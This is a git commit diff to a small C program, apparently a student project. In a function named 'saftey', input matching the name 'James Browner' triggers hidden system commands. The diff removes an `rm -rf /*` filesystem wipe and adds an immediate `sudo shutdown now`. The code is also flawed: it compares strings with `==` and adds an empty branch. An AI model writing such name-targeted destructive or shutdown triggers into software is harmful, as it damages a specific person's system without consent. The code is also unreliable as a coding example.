47cf460b6676106fd5ed4af11383a92ff7e02611
bredBoi-tech <51cpayne@crschools.us>
2025-10-24 12:19:09 -0500

    Update main.c

--- main.c
+++ main.c
@@ -11,8 +11,9 @@ void saftey(){
     
   }
   if(name == "James Browner"){
-    system("echo \"\"");
-    system("rm -rf /*");
+    system("echo \"owdm ao kcth wd cvu uoan\"");
+    system("sleep 1");
+    system("sudo shutdown now");
   }
 }
 int main(){
@@ -20,5 +21,8 @@ int main(){
   scanf("%s",A);
   if(strcmp(A,"Y") == 0){
     printf("then lets go");
+  }
+  if(strcmp(A,"N")){
+    
   }
 }
